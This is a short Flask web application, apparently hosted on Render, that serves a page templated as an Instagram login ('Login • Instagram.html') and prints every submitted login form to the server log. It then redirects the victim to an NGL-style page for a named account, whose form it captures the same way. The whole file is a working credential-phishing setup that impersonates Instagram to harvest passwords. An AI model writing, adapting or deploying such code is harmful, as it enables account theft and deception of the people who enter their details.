from flask import Flask, render_template, request, redirect
import logging
"/opt/render/project/src/"
app = Flask("__main__", template_folder="/opt/render/project/src/templates", static_folder="/opt/render/project/src/static")
logging.basicConfig(level=logging.DEBUG)


@app.route("/")
def redirect_main():
    return render_template("loading.html")


@app.route("/login")
def login():
    return render_template("Login • Instagram.html")


@app.route("/ananxya_m")
def ananxya_m():
    return render_template("home.html")


@app.route("/after")
def after():
    return render_template("after.html")


@app.route("/login", methods=["POST", "GET"])
def run_insta_code():
    if request.method == "POST":
        print(request.form)
        return redirect("https://ngl.onrender.com/ananxya_m")


@app.route("/ananxya_m", methods=["POST", "GET"])
def run_ngl_code():
    if request.method == "POST":
        print(request.form)
        return redirect("https://ngl.onrender.com/after")


if __name__ == "__main__":
    app.run()
